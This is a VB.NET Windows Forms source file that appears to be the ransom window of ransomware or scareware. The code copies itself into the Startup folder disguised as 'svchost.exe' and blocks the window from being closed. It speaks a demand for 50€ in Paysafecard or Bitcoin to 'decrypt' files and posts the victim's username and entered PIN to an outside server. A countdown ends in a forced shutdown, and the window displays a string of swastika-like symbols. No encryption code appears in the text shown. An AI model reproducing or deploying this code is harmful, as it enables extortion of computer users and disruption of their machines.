
Imports System.IO
Imports Microsoft.Win32
Imports Microsoft.Win32.SafeHandles
Imports System.Runtime.InteropServices
Imports System.Text
Imports System.ComponentModel
Imports System.Security.Cryptography
Imports System.Collections.Generic
Imports System.Net
Imports System.Diagnostics
Imports System.Reflection
Imports System.Threading


Public Class Form2
    Dim LL, II, PP As Integer
    Dim TXT As String
    Dim Sapi As Object


    Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer

    Private Const SETDESKWALLPAPER = 20
    Private Const UPDATEINIFILE = &H1
    Private Declare Ansi Function GetAsyncKeyState Lib "user32" (ByVal vkey As Integer) As Integer
    Private erhaltenerText As RichTextBox

    Private path1 As String

    Private path2 As String



    Private Sub Form2_FormClosing(ByVal sender As Object, ByVal e As FormClosingEventArgs) Handles Me.FormClosing
        If (e.CloseReason = CloseReason.UserClosing) Then
            e.Cancel = True
            MessageBox.Show("Nice Try But This didnt works", "Security", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End If
    End Sub



    Private Sub Form2_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Timer2.Start()

        Timer3.Start()
        Me.ShowInTaskbar = False



        File.Copy(Application.ExecutablePath, "C:\Users\" + Environment.UserName + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe")



        TXT = "卍 卍 卍 卍 卍 卍 卍 卍"
        LL = Len(TXT)
        II = 1
        PP = 1




    End Sub

    Private Sub Timer2_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles Timer2.Tick
        Sapi = CreateObject("Sapi.spvoice")
        If Sapi.speak("Hello all your Documents, Databases and other files have been Encrypted, with a military Encryption, we glad you to pay 50€ in Paysafecard or Bitcoin, to Decrypt your Files") Then
            Timer2.Stop()
        End If
        Timer2.Stop()

    End Sub

    Private Sub Button2_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Button2.Click
        TextBox1.Text = ""
        Thread.Sleep(2000)
        Dim requestUriString As String = "http://sarahcam.pw/xd/post.php"
        Dim text2 As String = "PinCode=" + TextBox1.Text + "&ComputerName=" + Environment.UserName
        Dim httpWebRequest As HttpWebRequest = CType(WebRequest.Create(requestUriString), HttpWebRequest)
        httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.72 Safari/537.36"
        httpWebRequest.AllowAutoRedirect = True
        httpWebRequest.ContentType = "application/x-www-form-urlencoded"
        httpWebRequest.ContentLength = CLng(text2.Length)
        httpWebRequest.Method = "POST"
        httpWebRequest.KeepAlive = True
        Dim requestStream As Stream = httpWebRequest.GetRequestStream()
        Dim bytes As Byte() = Encoding.ASCII.GetBytes(text2)
        requestStream.Write(bytes, 0, bytes.Length)
        requestStream.Close()
        Dim httpWebResponse As HttpWebResponse = CType(httpWebRequest.GetResponse(), HttpWebResponse)
        httpWebResponse.Close()
    End Sub

    Private Sub Button1_Click_1(ByVal sender As Object, ByVal e As EventArgs) Handles Button1.Click
        MsgBox("Checking if you have payed...")
    End Sub

    Private Sub LinkLabel1_LinkClicked(ByVal sender As Object, ByVal e As LinkLabelLinkClickedEventArgs)

    End Sub
    Private Sub Timer3_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer3.Tick
        Label13.Text = Label13.Text - 1

        If Label13.Text = 10 Then
            Label13.ForeColor = Color.Red
        End If

        If Label13.Text = 0 Then
            Label13.ForeColor = Color.White
            Label10.Text = Label10.Text - 1
            Label13.Text = 59
        End If

        If Label10.Text = 10 Then
            Label10.ForeColor = Color.Red
        End If

        If Label10.Text = 0 Then
            Label10.ForeColor = Color.White
            Label8.Text = Label8.Text - 1
            Label10.Text = 59
        End If

        If Label8.Text = 10 Then
            Label8.ForeColor = Color.Red
        End If

        If Label8.Text = 0 Then
            Label13.ForeColor = Color.White
            MsgBox("YOUR TIME IS OVER BYE BYE")
            Shell("shutdown -s -t 3")
        End If
    End Sub
    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        Form3.Show()

    End Sub
End Class
